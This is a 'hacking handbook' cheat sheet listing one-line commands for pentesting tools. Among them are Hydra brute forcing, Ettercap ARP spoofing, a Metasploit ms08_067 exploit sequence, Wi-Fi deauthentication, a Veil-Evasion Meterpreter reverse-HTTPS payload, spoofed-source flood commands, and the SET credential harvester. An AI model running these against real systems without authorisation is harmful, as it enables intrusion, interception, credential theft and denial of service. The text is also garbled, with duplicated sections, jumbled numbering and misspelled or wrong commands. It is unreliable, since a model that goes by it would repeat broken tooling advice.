# Full HACKING HandBook {2023}           \[X-3306]/
Typical tools/commands for ethical hackers, pentesting and everyone!


# 1.1 Nmap
- nmap -p 1-65535 192.168.1.1
- nmap -sV 192.168.1.1
- nmap -O 192.168.1.1
- nmap -p 1-65535 -sV -sS -T4 target

1.2 Masscan
- masscan -p1-65535,U:1-65535 --rate 10000 --wait 0 --open-only target
- nmap -p 1-65535 -sV -sS -T4 target

1.2 Masscan
- masscan -p1-65535,U:1-65535 --rate 10000 --wait 0 --open-only target

# 1.2 Masscan
- masscan -p1-65535 192.168.0.0/16

# Chapter 2: Testing Web Applications

2.1 Burp Suite
- Repeater
- Intruder
- sequencer

2.2 OWASP ZAP
- Spider
- Fuzzer
- Passive Scan

# Chapter 3: Source code analysis

3.1 SonarQube
- mvn sonar:sonar

3.2 Flawfinder
- flafinder /path/to/code

# Chapter 4: Testing Authentication and Authentication

4.1 Hydra
- hydra -l admin -P /path/to/list/password ftp://192.168.1.1

4.2 John the Ripper
- john --wordlist=/path/to/list/hash.txt

# Chapter 5: Testing the database

5.1 SQLMap
- sqlmap -u "http://example.com/?id=1" --dbs

5.2 NoSQLMaps
- nosqlmap -t http://example.com -p 80 -u /path/to/db

# Chapter 6: Binary analysis and reverse engineering

6.1 Ghidra
- Decompiler
- Code Analyzer

6.2 Radar2
- r2 /path/to/file/binary
- ah
- s main
- VV
- radare2 binary_file
- aaa
- afl

23.2 GDB-PEDA
- gdb -q binary_file
- break main
- run

# Chapter 7: Testing the Network Infrastructure

7.1 Wireshark
- tshark -i eth0

7.2 Ettercap
- ettercap -T -q -i eth0 -M arp:remote /192.168.1.1// /192.168.1.2//

# Chapter 8: Vulnerability detection and exploitation

8.1 Metasploit Framework
- msfconsole
- search exploit/windows/smb
- use exploit/windows/smb/ms08_067_netapi
- set RHOST 192.168.1.1
- exploit

8.2 Exploit Database
- searchsploit apache 2.2

# Chapter 9: Testing Wireless Systems

9.1 Aircrack-ng
- airmon-ng start wlan0
- airodump-ng wlan0mon
- aireplay-ng -0 5 -a BSSID -c CLIENT wlan0mon
- aircrack-ng -b BSSID -w wordlist.txt capture.cap

9.2 WiFi
- wifite -w WPA
- wifite --kill -mac -c CHANNEL -b BSSID

# Chapter 10: Vulnerability analysis and risk management

10.1 OpenVAS
- openvas-start
- openvas-nvt-sync
- openvas-scapdata-sync
- openvas-certdata-sync

10.2 Nessus
- nessuscli update --all
- nessuscli scan new --policy "Policy Name" --name "Scan Name" --target 192.168.1.1

# Chapter 11: Automation and Scripting

11.1 Python
- Scapy
- Requests
- Beautiful Soup

11.2 Bash
- curl
- grep
- awk

# Chapter 12: Protecting Systems and Applications

12.1 ModSecurity
- SecRuleEngine On
- SecRequestBodyAccess On
- SecResponseBodyAccess Off

12.2 Fail2Ban
- fail2ban client status
- fail2ban-client set sshd unbanip 192.168.1.1

# Chapter 13: Testing Mobile Devices

13.1 Driver
- drone agent start
- driver console connect

13.2 Frida
- frida-ps -U
- frida-trace -U -i "*open*" com.example.app

# Chapter 14: Testing Your Cloud Infrastructure

14.1 Scout Suite
- scoutsuite --provider aws --access-key xxx --secret-key xxx

14.2 Prowler
- prowler -c check11

# Chapter 15: Physical Security and Social Engineering

15.1 Proxmark3
- proxmark3 /dev/ttyACM0
- lf search
- hf search

15.2 Social-Engineer Toolkit (SET)
- setoolkit
- 1) Social-Engineering Attacks
- 2) Website Attack Vectors
- 3) Credential Harvester Attack Method

# Chapter 16: Testing IoT Security

16.1 Shodan
- shodan search --fields ip_str,port,org,hostnames "port:23"

16.2 Firmware Analysis Toolkit (FAT)
- ./fat.py -f /path/to/firmware.bin

# Chapter 17: Testing Concealment and Avoidance

17.1 Track
- torsocks wget http://example.onion

17.2 Veil Evasion
- ./Veil-Evasion.py
- use payload/python/meterpreter/rev_https_contained
- set LHOST 192.168.1.1
- generate

# Chapter 18: Container Security Testing

18.1 Docker Bench
- docker run -it --net host --pid host --userns host --cap-add audit_control -e DOCKER_CONTENT_TRUST=$DOCKER_CONTENT_TRUST -v /var/lib:/var/lib -v /var/run/docker.sock :/var/run/docker.sock -v /usr/lib/systemd:/usr/lib/systemd -v /etc:/etc --label docker_bench_security docker/docker-bench-security

18.2 Clair
- clairctl analyze --local IMAGE_NAME

# Chapter 19: DDoS Mitigation Testing

19.1 hping3
- hping3 -S -p 80 --flood --rand-source TARGET_IP

19.2 T50
- t50 TARGET_IP --flood --turbo -protocol icmp

# Chapter 20: Testing the Security of Cloud Applications

20.1 Cloud Security Suite (cs-suite)
- python cs.py --provider aws --access-key xxx --secret-key xxx

20.2 Kube Bench
- kube-bench master
- kube-bench node

# Chapter 21: Analysis and Reverse Engineering of Malware

24.1 Cuckoo Sandbox
- cuckoo submit sample.exe
- cuckoo

24.2 YARA
- yara -r my_rule.yar /path/to/analyze/

# Chapter 22: Security testing in SCADA/ICS environments

25.1 PLCScan
- python3 plcscan.py --target IP_ADDRESS

25.2 Nmap
- nmap --script=modbus-discover,nntp-info IP_ADDRESS

# Chapter 23: Using Artificial Intelligence to Investigate Vulnerabilities

26.1 DeepExploit
- python3 deep_exploit.py -t TARGET_IP

26.2 AutoSploit
- python autosploit.py --set target TARGET_IP
